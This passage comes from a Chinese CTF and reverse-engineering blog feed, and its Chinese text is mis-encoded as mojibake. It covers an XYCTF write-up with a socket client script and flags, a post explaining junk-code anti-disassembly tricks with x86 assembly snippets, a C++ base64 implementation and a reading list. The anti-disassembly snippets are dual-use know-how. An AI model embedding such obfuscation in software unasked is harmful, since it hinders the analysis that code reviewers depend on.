this_choice = back(get_most_count(alist))</span><br><span class="line">    <span class="comment"># å‘é€é€‰æ‹©</span></span><br><span class="line">    client_socket.send((this_choice + <span class="string">&#x27;\n&#x27;</span>).encode())</span><br><span class="line">    <span class="built_in">print</span>(this_choice)</span><br><span class="line">    <span class="comment"># ç­‰å¾…ä¸€æ®µæ—¶é—´ä»¥ä¾¿æœåŠ¡å™¨å¤„ç†æˆ‘ä»¬çš„è¾“å…¥</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»å–å¹¶æ‰“å°æœåŠ¡å™¨çš„å“åº”</span></span><br><span class="line">    data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;æ¥æ”¶åˆ°çš„æ•°æ®: <span class="subst">&#123;data&#125;</span>&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ ¹æ®æ¸¸æˆçš„ç»“æœæ¥æ›´æ–°ä¸Šä¸€æ¬¡çš„é€‰æ‹©æˆ–ç»“æŸæ¸¸æˆ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;win&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        alist.append(this_choice)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        client_socket.close()</span><br><span class="line">        <span class="keyword">break</span>  <span class="comment"># ç»“æŸæ¸¸æˆå¾ªç¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é—­è¿æ¥</span></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># XYCTF&#123;6e6e643f-8bf5-4d67-a0d7-be3a6d7cbedc&#125;</span></span><br><span class="line"><span class="comment"># è®°ä¸å¾—äº†ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªflag</span></span><br></pre></td></tr></table></figure><h4 id="ç¾å¦™çš„æ­Œå£°">ç¾å¦™çš„æ­Œå£°</h4><p>ç”¨audacityæ‰“å¼€ï¼Œä»¥é¢‘è°±å›¾æ¨¡å¼è§‚å¯Ÿï¼Œå‘ç°å­—ç¬¦ä¸²ï¼šXYCTF_1s_w3ll</p><p>è¿™ä¸ªçœ‹èµ·æ¥ä¸æ˜¯flagï¼Œä½†æ˜¯å¯èƒ½æ˜¯å…¶å®ƒä¸œè¥¿ï¼Œç”¨deepsoundæ‰“å¼€ï¼ŒæŠŠè¿™ä¸ªå½“å¯†ç ï¼Œå¾—åˆ°flag.txt</p><p>å†…å®¹æ˜¯</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;T0uch_y0ur_he3rt_d55ply!!&#125;</span><br></pre></td></tr></table></figure><hr><p>æ€»ç»“ï¼š</p><p>reéƒ¨åˆ†è¿˜æ˜¯æ¯”è¾ƒç®€å•ï¼ŒåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆé—®é¢˜<br>å¤§éƒ¨åˆ†æ˜¯åŸºç¡€å†…å®¹ï¼Œæ²¡æœ‰ollvmå’Œå¤æ‚çš„èŠ±ä¹Ÿæ²¡æœ‰å¼ºçš„å£³ï¼Œ<br>å°±ç›´æ¥åˆ†æé€»è¾‘æˆ–è€…åŠ¨è°ƒå°±å¯ä»¥è§£ï¼Œreè¿˜æ˜¯åç®€å•çš„</p><p>ç±»å‹ï¼š</p><p>ä¸¤é“flagä¸æ˜¯è¾“å…¥çš„é¢˜ï¼šé¾™èŠ¯å’Œç™½æœˆå…‰</p><p>å…¶å®ƒéƒ½æ˜¯ç›´æ¥é€†å‘çš„é¢˜ï¼š</p><p>è‡ªå®šä¹‰é€»è¾‘</p><p>asm</p><p>ä¼ªvm</p><p>â€¦</p><p>baby unityé‡Œé¢çš„å·¥å…·åœ¨ä½¿ç”¨åä¼šç›´æ¥è¿˜åŸcsharpæ–¹æ³•åï¼Œåœ¨dumpdllæ–‡ä»¶å¤¹ä¸­</p><p>cryéƒ¨åˆ†ä¼šä¸äº†ä¸€ç‚¹ï¼Œä¸è¿‡å¯†ç âœŒè¦å¸¦æˆ‘ï¼Œå¤ªå¥½äº†<br>ä¹‹åé—®ä¸€ä¸‹rsaçš„éƒ¨åˆ†ï¼Œè¿˜æœ‰å¤æ•°åŸŸçš„å†…å®¹</p><p>miscéƒ¨åˆ†è¿˜æ˜¯åšçš„å°‘äº†ï¼Œè¦å¤šç»ƒï¼Œä¸ç„¶å¥½å¤šæ²¡è§è¿‡çš„<br>è¿™æ¬¡å­¦åˆ°äº†éŸ³é¢‘ï¼ŒäºŒç»´ç å’Œæ°´å°<br>ä»¥åŠæ€»ç»“ä¸€ä¸‹ncé¢˜çš„åšæ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"><span class="comment"># è¿æ¥çš„æ–¹å¼</span></span><br><span class="line"></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="comment"># æ¥å—æ•°æ®çš„æ–¹å¼</span></span><br><span class="line"></span><br><span class="line">client_socket.send((<span class="string">&quot;xxx&quot;</span>).encode())</span><br><span class="line"><span class="comment"># ä¸Šä¼ çš„æ–¹å¼</span></span><br><span class="line"></span><br><span class="line">client_socket.close()</span><br><span class="line"><span class="comment"># å…³é—­çš„æ–¹å¼</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªæ–¹æ³•ä¸Šä¼ å’Œè§£ææœåŠ¡å™¨çš„æ•°æ®å¹¶æäº¤å†…å®¹</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>èŠ±æŒ‡ä»¤ç ”ç©¶</title>
      <link href="/posts/9ffaa92b.html"/>
      <url>/posts/9ffaa92b.html</url>
      
        <content type="html"><![CDATA[<p>é‚£å¤©ï¼Œæˆ‘é‡åˆ°äº†destinationé‚£é“é¢˜ï¼Œç„¶åé‡åˆ°äº†sehå’ŒèŠ±æŒ‡ä»¤ã€‚<br>ç„¶åï¼Œæˆ‘è‹¦æ€å†¥æƒ³ï¼Œè¿˜æ˜¯ä¸ä¼šï¼Œé‚é—®å‡ºé¢˜äººï¼Œå‡ºé¢˜äººæ›°ï¼šèœå°±å¤šç»ƒã€‚äºæ˜¯æœ¬ç¯‡åšå®¢å°±å‡ºç°äº†ã€‚</p><p>å‚è€ƒï¼š[<a href="https://bbs.kanxue.com/thread-279604.htm#msg_header_h2_10">åŸåˆ›][èŠ±æŒ‡ä»¤]ç”±æ˜“åˆ°éš¾å…¨é¢è§£æCTFä¸­çš„èŠ±æŒ‡ä»¤-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><h2 id="å‰è¨€">å‰è¨€</h2><p>å…ˆäº†è§£ä¸€ä¸‹èŠ±æŒ‡ä»¤ï¼š</p><p>èŠ±æŒ‡ä»¤æ˜¯ä¸“é—¨é’ˆå¯¹é™æ€åˆ†æçš„ã€‚ä¸”ä¸åœ¨æ„é€†å‘å·¥ç¨‹å¸ˆå¯ä¸å¯ä»¥çœ‹å‡ºæ¥ï¼Œå…³é”®åœ¨äºè®©å·¥ç¨‹å¸ˆé€†ä¸å‡ºæ¥ã€‚å¯¹äºåŠ¨æ€è°ƒè¯•ï¼Œå°±è¦çœ‹æƒ…å†µäº†ï¼Œæœ‰çš„å¯ä»¥ç›´æ¥å‡ºæ¥ï¼Œæœ‰çš„åˆæä¸å‡ºæ¥ã€‚</p><hr><p>åç¼–è¯‘å™¨çš„ç¼–è¯‘æ–¹æ³•ï¼š</p><p>é€’å½’ä¸‹é™+çº¿æ€§æ‰«æï¼š</p><ul><li>ä»å…¥å£å¼€å§‹ä¾æ¬¡è§£ææŒ‡ä»¤+é‡åˆ°åˆ†æ”¯æŒ‡ä»¤ä¼šé€’å½’è¿›å…¥åˆ†æ”¯è¿›è¡Œåç¼–è¯‘</li></ul><p>é”™è¯¯åŸç†ï¼š</p><ul><li>æœºå™¨ç é•¿åº¦ä¸å›ºå®šï¼Œæ’å…¥ä¸€ä¸ªæœ‰æŒ‡ä»¤ä½œç”¨çš„æ•°æ®ä¼šå¯¼è‡´å…¶è¢«è§£ææˆæŒ‡ä»¤éšåçš„nä¸ªå­—èŠ‚ä¼šè¢«è§£é‡Šä¸ºæ“ä½œæ•°ï¼Œè¿™æ ·ä¹‹åçš„å†…å®¹å°±æ— æ³•åç¼–è¯‘äº†</li></ul><hr><p>èŠ±æŒ‡ä»¤åˆ†ä¸ºä¸¤ç§ï¼š</p><p>è¢«æ‰§è¡Œçš„èŠ±æŒ‡ä»¤å’Œä¸è¢«æ‰§è¡Œçš„èŠ±æŒ‡ä»¤</p><p>ä¸è¢«æ‰§è¡Œçš„èŠ±æŒ‡ä»¤å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">jmp Label1</span><br><span class="line">db junkcode</span><br><span class="line">Label1:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§jmpçš„å¯ä»¥ç›´æ¥nopæ‰ï¼ˆä¸è¿‡è¿™ä¸ªä¼šè¢«ç›´æ¥è¯†åˆ«å‡ºæ¥ï¼‰</p><p>å¯ä»¥è¿™æ ·ï¼š</p><p>jmp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">asm</span><br><span class="line">&#123;</span><br><span class="line">  Jz Label</span><br><span class="line">  Jnz Label</span><br><span class="line">  Db thunkcode;åƒåœ¾æ•°æ®</span><br><span class="line">Label:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ°¸æ’è·³è½¬ï¼Œä½†æ˜¯idaæ— æ³•è¯†åˆ«</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm&#123;</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">test</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">    jnz label</span>1</span><br><span class="line"><span class="symbol">    jz label</span>2</span><br><span class="line"><span class="symbol">label1:</span></span><br><span class="line">    _emit junkcode</span><br><span class="line"><span class="symbol">label2:</span></span><br><span class="line">   <span class="keyword">pop</span> <span class="built_in">ebx</span>//éœ€è¦æ¢å¤<span class="built_in">ebx</span>å¯„å­˜å™¨   </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__asm&#123;</span><br><span class="line">    <span class="keyword">clc</span></span><br><span class="line"><span class="symbol">    jnz label</span>1:</span><br><span class="line">    _emit junkcode</span><br><span class="line"><span class="symbol">label1:</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ°¸æ’è·³è½¬ï¼Œä¸è¿‡ä½¿ç”¨testå¼ºåˆ¶è½¬æ¢æ ‡å¿—ä½</p><p>call&amp;ret:</p><blockquote><p>callæŒ‡ä»¤çš„æœ¬è´¨ï¼špush eipï¼Œç„¶åjmp å‡½æ•°åœ°å€</p><p>retæŒ‡ä»¤çš„æœ¬è´¨ï¼špop eip</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line">call LABEL9;</span><br><span class="line">_emit 0x83;</span><br><span class="line">LABEL9:</span><br><span class="line">add dword ptr ss : [esp] , 8;ç»™æ ˆä¸­çš„eipåŠ 8ï¼Œç›´æ¥è·³è¿‡è¿™å‡ æ¡è¯­å¥</span><br><span class="line">ret;</span><br><span class="line">__emit 0xF3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥è¯¦ç»†äº†è§£ä¸€ä¸‹call</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">call near xxx;é»˜è®¤ä¸ºnearï¼Œå¯çœï¼Œç›¸å¯¹ä¸‹ä¸€æ¡æŒ‡ä»¤ä½ç½®è°ƒç”¨å‡½æ•°ï¼ˆæ®µä¸å˜ï¼‰</span><br><span class="line">E8 xx xx;</span><br><span class="line"></span><br><span class="line">call ax;é—´æ¥ç»å¯¹è¿‘è·ç¦»è°ƒç”¨</span><br><span class="line">call [addr];é—´æ¥ç»å¯¹è¿‘è·ç¦»è°ƒç”¨</span><br><span class="line">ff xx;</span><br><span class="line"></span><br><span class="line">call far æ®µåŸºå€:æ®µå†…åç§»;ç›´æ¥ç»å¯¹è¿œè·ç¦»è°ƒç”¨,å¯ä»¥ä¸åŠ far,è¿”å›å¿…é¡»ç”¨retf</span><br><span class="line">0x9a xx xx xx xx;å‰2å­—èŠ‚æ˜¯æ®µå†…åç§»ï¼Œå2å­—èŠ‚æ˜¯æ®µåŸºå€,è¿™ç§æƒ…å†µä¸‹ï¼ŒCSå’Œipå‡è¦å‹æ ˆ</span><br><span class="line"></span><br><span class="line">call far [addr];é—´æ¥ç»å¯¹è¿œè·ç¦»è°ƒç”¨</span><br><span class="line">ff1e xx xx xx xx;å‰2å­—èŠ‚æ˜¯æ®µå†…åç§»ï¼Œå2å­—èŠ‚æ˜¯æ®µåŸºå€</span><br></pre></td></tr></table></figure><hr><h2 id="ä¸€">ä¸€</h2><p>è¿™ä¹‹ä¸Šæ˜¯æˆ‘ä¸€å¼€å§‹å¯¹èŠ±æŒ‡ä»¤çš„äº†è§£ï¼Œä½†æ˜¯éšç€æˆ‘å‡ºäº†flower_teaè¿™é“é¢˜ä¹‹åï¼Œæˆ‘å¯¹èŠ±æŒ‡ä»¤æœ‰äº†ï¼ˆæ„Ÿè§‰ä¸Šï¼‰æ›´æ·±çš„çœ‹æ³•</p><p>èŠ±æŒ‡ä»¤junk_codeçš„ç›®çš„ï¼š</p><p>é’ˆå¯¹åç¼–è¯‘å™¨ï¼Œå¹²æ‰°åç¼–è¯‘å™¨ä½¿å…¶æ— æ³•è§£ææŒ‡ä»¤ï¼Œåªèƒ½ç”¨æœºå™¨ç è¡¨ç¤ºã€‚å†è€…å°±æ˜¯è€ƒè™‘é’ˆå¯¹åç¼–è¯‘å™¨ç‰¹æ€§ï¼Œé€‰æ‹©æ„é€ ç»“æ„è®©å®ƒä»¬ä¸èƒ½æŠŠå¯¹åº”ä»£ç è¯†åˆ«æˆä¸€ä¸ªå‡½æ•°</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> åé™æ€åˆ†æ </category>
          
          <category> èŠ±æŒ‡ä»¤ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>base64å®ç°</title>
      <link href="/posts/2c2fa1f6.html"/>
      <url>/posts/2c2fa1f6.html</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å¤ä¹ ï¼ŒæŠŠå†™çš„base64å‘åœ¨è¿™é‡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;String&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">en</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> string table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; input;</span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; output;</span><br><span class="line"><span class="comment">//åˆå§‹åŒ–input</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : str) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é•¿åº¦æ£€æŸ¥</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> len_before = str.<span class="built_in">length</span>();</span><br><span class="line"><span class="type">uint8_t</span> fix_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">switch</span> (len_before % <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">fix_num++;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">fix_num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‰§è¡Œç¼–ç </span></span><br><span class="line"><span class="type">uint8_t</span> save[<span class="number">4</span>] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len_before; i += <span class="number">3</span>) &#123;</span><br><span class="line">save[<span class="number">0</span>] = input[i] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">0</span>]]);</span><br><span class="line">save[<span class="number">1</span>] = (input[i] &amp; <span class="number">0b00000011</span>) &lt;&lt; <span class="number">4</span> | input[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">1</span>]]);</span><br><span class="line">save[<span class="number">2</span>] = (input[i + <span class="number">1</span>] &amp; <span class="number">0b00001111</span>) &lt;&lt; <span class="number">2</span> | input[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>;</span><br><span class="line">save[<span class="number">3</span>] = input[i + <span class="number">2</span>] &amp; <span class="number">0b00111111</span>;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">2</span>]]);</span><br><span class="line">output.<span class="built_in">push_back</span>(table[save[<span class="number">3</span>]]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¤„ç†æœ«å°¾æ•°æ®</span></span><br><span class="line"><span class="keyword">if</span> (output.<span class="built_in">back</span>() == table[<span class="number">0</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">output.<span class="built_in">pop_back</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fix_num; i++) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>(table[<span class="number">64</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ç»„åˆå­—ç¬¦ä¸²å¹¶è¿”å›</span></span><br><span class="line"><span class="function">string <span class="title">res</span><span class="params">(output.begin(), output.end())</span></span>;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">de</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> string table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line">vector&lt;<span class="type">uint8_t</span>&gt; input;</span><br><span class="line">vector&lt;<span class="type">uint8_t</span>&gt; output;</span><br><span class="line"><span class="comment">// åˆå§‹åŒ–input</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : str) &#123;</span><br><span class="line">input.<span class="built_in">push_back</span>(table.<span class="built_in">find</span>(c));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ‰§è¡Œè§£ç </span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; input.<span class="built_in">size</span>(); i += <span class="number">4</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i] &lt;&lt; <span class="number">2</span>) | (input[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>));</span><br><span class="line"><span class="keyword">if</span> (input[i + <span class="number">2</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) | (input[i + <span class="number">2</span>] &gt;&gt; <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (input[i + <span class="number">3</span>] != <span class="number">64</span>) &#123;</span><br><span class="line">output.<span class="built_in">push_back</span>((input[i + <span class="number">2</span>] &lt;&lt; <span class="number">6</span>) | input[i + <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç»„åˆå­—ç¬¦ä¸²å¹¶è¿”å›</span></span><br><span class="line"><span class="function">string <span class="title">res</span><span class="params">(output.begin(), output.end())</span></span>;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;please use Ctrl+Z to quit\n&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;please input your string:\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">string str;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">getline</span>(cin, str))</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">en</span>(str) &lt;&lt; endl &lt;&lt; <span class="built_in">de</span>(<span class="built_in">en</span>(str)) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\nplease input your string:\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”¶å½•æ–‡ç« </title>
      <link href="/posts/6fa4e3c4.html"/>
      <url>/posts/6fa4e3c4.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><p>[<a href="https://bbs.kanxue.com/thread-279604.htm#msg_header_h2_10">åŸåˆ›][èŠ±æŒ‡ä»¤]ç”±æ˜“åˆ°éš¾å…¨é¢è§£æCTFä¸­çš„èŠ±æŒ‡ä»¤-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p><a href="https://www.52pojie.cn/thread-326995-1-1.html">UPXé˜²è„±å£³æœºè„±å£³ã€å»é™¤ç‰¹å¾ç ã€æ·»åŠ èŠ±æŒ‡ä»¤å°æ¢ - ã€è„±å£³ç ´è§£åŒºã€ - å¾çˆ±ç ´è§£ - LCG - LSG |å®‰å“ç ´è§£|ç—…æ¯’åˆ†æ|www.52pojie.cn</a></p><p><a href="https://www.cnblogs.com/bEngi1/p/12173719.html">ã€Œå­¦ä¹ ç¬”è®°ã€å¯¹å®æ¨¡å¼/ä¿æŠ¤æ¨¡å¼çš„ä¸‰ç§è®¿é—®å†…å­˜æœºåˆ¶çš„ç†è§£ - å¹¼éºŸ - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/chenwb89/p/operating_system_003.html#commentform">æ“ä½œç³»ç»Ÿç¯‡-åˆ†æ®µæœºåˆ¶ä¸GDT|LDT - å«å - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="CRYPTO">CRYPTO</h2><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">RSA | Lazzaro (lazzzaro.github.io)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜è®°å½•(3)</title>
      <link href="/posts/e5147fe.html"/>
      <url>/posts/e5147fe.html</url>
      
